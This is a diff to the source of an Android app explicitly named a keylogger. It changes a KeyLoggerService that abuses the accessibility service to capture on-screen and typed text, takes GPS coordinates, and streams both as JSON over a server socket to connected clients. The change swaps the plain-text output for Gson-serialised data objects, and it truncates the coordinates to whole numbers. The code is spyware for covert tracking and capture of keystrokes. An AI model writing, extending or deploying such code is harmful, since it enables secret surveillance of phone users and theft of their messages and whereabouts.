@@ -13,12 +13,16 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import androidx.core.app.ActivityCompat
 import androidx.localbroadcastmanager.content.LocalBroadcastManager
+import com.example.keylogger.data.Data
+import com.example.keylogger.data.Geo
+import com.example.keylogger.data.TYPE
 import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationCallback
 import com.google.android.gms.location.LocationRequest
 import com.google.android.gms.location.LocationResult
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.location.Priority
+import com.google.gson.Gson
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -38,6 +42,8 @@ class KeyLoggerService : AccessibilityService() {
     private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private lateinit  var serverSocket: ServerSocket
     private val clientsList = ArrayList<ClientHandler>()
+
+    private val gson = Gson()
 
     private val broadcastReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -68,7 +74,13 @@ class KeyLoggerService : AccessibilityService() {
         locationCallback = object : LocationCallback() {
             override fun onLocationResult(locationResult: LocationResult) {
                 for (location in locationResult.locations) {
-                    coroutineScope.launch { sendToClient("Lat: ${location.latitude}, Lng: ${location.longitude}") }
+                    val data = Data(
+                        TYPE.GEO,
+                        geo = Geo(location.latitude.toLong(), location.longitude.toLong()),
+                        message = ""
+                    )
+                    val jsonData = gson.toJson(data)
+                    coroutineScope.launch { sendToClient(jsonData) }
                 }
             }
         }
@@ -98,7 +110,12 @@ class KeyLoggerService : AccessibilityService() {
                 val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss") //设置日期格式
                 val currentTime = "[" + dateFormat.format(Date()) + "]" // new Date()为获取当前系统时间
                 val text = currentTime + event.text.toString()
-                coroutineScope.launch { sendToClient(text) }
+                val data = Data(
+                    TYPE.MESSAGE,
+                    message = text
+                )
+                val jsonData = gson.toJson(data)
+                coroutineScope.launch { sendToClient(jsonData) }
             }
 
             else -> {}
